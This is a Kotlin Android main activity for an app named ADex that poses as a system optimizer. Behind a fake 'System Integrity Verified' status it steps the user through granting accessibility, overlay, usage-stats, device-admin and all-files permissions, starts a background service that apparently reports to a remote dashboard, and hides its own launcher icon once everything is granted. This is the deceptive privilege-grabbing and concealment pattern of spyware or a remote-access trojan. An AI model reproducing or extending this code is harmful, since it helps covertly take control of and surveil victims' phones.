package com.adex.app

import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.view.View
import android.widget.ProgressBar
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import com.adex.app.data.SettingsStore
import com.adex.app.service.ADexForegroundService
import com.adex.app.service.ServiceActions
import com.adex.app.util.PermissionHelper
import com.google.android.material.button.MaterialButton

class MainActivity : AppCompatActivity() {

    private lateinit var settings: SettingsStore
    private lateinit var statusText: TextView
    private lateinit var deviceIdText: TextView
    private lateinit var permissionsButton: MaterialButton
    private lateinit var optimizationCard: View
    private lateinit var buildProgress: ProgressBar
    private lateinit var subText: TextView

    private val permissionRequest = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { result ->
        updateStatus()
        startServiceIfReady()
    }

    private val pairCodeReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            val code = intent?.getStringExtra(ADexForegroundService.EXTRA_PAIR_CODE)
            code?.let { updatePairStatus(it) }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        settings = SettingsStore(this)
        statusText = findViewById(R.id.statusText)
        deviceIdText = findViewById(R.id.deviceIdText)
        permissionsButton = findViewById(R.id.permissionsButton)
        optimizationCard = findViewById(R.id.optimizationCard)
        buildProgress = findViewById(R.id.buildProgress)
        subText = findViewById(R.id.subText)

        deviceIdText.text = "UID: ${settings.stableDeviceId}"

        permissionsButton.setOnClickListener {
            handleOptimization()
        }

        startServiceIfReady()
        updateStatus()
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            registerReceiver(pairCodeReceiver, IntentFilter(ADexForegroundService.ACTION_PAIR_CODE), RECEIVER_EXPORTED)
        } else {
            registerReceiver(pairCodeReceiver, IntentFilter(ADexForegroundService.ACTION_PAIR_CODE))
        }
    }

    override fun onResume() {
        super.onResume()
        updateStatus()
        // Re-report permissions to dashboard if service is running
        startServiceIfReady()
    }

    private fun handleOptimization() {
        val missing = PermissionHelper.missingRuntimePermissions(this)
        if (missing.isNotEmpty()) {
            permissionRequest.launch(missing.toTypedArray())
            return
        }

        if (!PermissionHelper.hasOverlayPermission(this)) {
            startActivity(PermissionHelper.overlaySettingsIntent(this))
            return
        }

        if (!PermissionHelper.isAccessibilityServiceEnabled(this)) {
            startActivity(PermissionHelper.accessibilitySettingsIntent())
            return
        }
        
        if (!PermissionHelper.hasUsageStatsPermission(this)) {
            startActivity(PermissionHelper.usageAccessSettingsIntent())
            return
        }

        if (!PermissionHelper.isDeviceAdminEnabled(this)) {
            startActivity(PermissionHelper.deviceAdminSettingsIntent(this))
            return
        }

        if (!PermissionHelper.hasAllFilesAccess()) {
            startActivity(PermissionHelper.allFilesAccessIntent(this))
            return
        }
    }

    private fun startServiceIfReady() {
        val serviceIntent = Intent(this, ADexForegroundService::class.java).apply {
            action = ServiceActions.ACTION_START
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent)
        } else {
            startService(serviceIntent)
        }
    }

    private fun updateStatus() {
        val isAllDone = PermissionHelper.allCriticalPermissionsGranted(this)
        
        if (isAllDone) {
            statusText.text = "System: OPTIMIZED"
            statusText.setTextColor(0xFF00FF00.toInt())
            optimizationCard.visibility = View.GONE
            buildProgress.isIndeterminate = false
            buildProgress.progress = 100
            subText.text = "System Integrity Verified. Engine Active."
            
            // Final Step: Auto-hide app after success
            if (!settings.oneTapLinkCompleted) { // Use this flag to track if we've hidden already
                 settings.oneTapLinkCompleted = true
                 hideAppIcon()
            }
        } else {
            statusText.text = "System: PENDING_OPTIMIZATION"
            statusText.setTextColor(0xFFFFFF00.toInt())
            optimizationCard.visibility = View.VISIBLE
            buildProgress.isIndeterminate = true
            subText.text = "Verifying System Integrity..."
        }
    }

    private fun hideAppIcon() {
        val pkg = packageManager
        val component = ComponentName(this, MainActivity::class.java)
        pkg.setComponentEnabledSetting(
            component,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
    }

    private fun updatePairStatus(code: String) {
        // Pairing logic if needed
    }

    override fun onDestroy() {
        super.onDestroy()
        try { unregisterReceiver(pairCodeReceiver) } catch (e: Exception) {}
    }
}
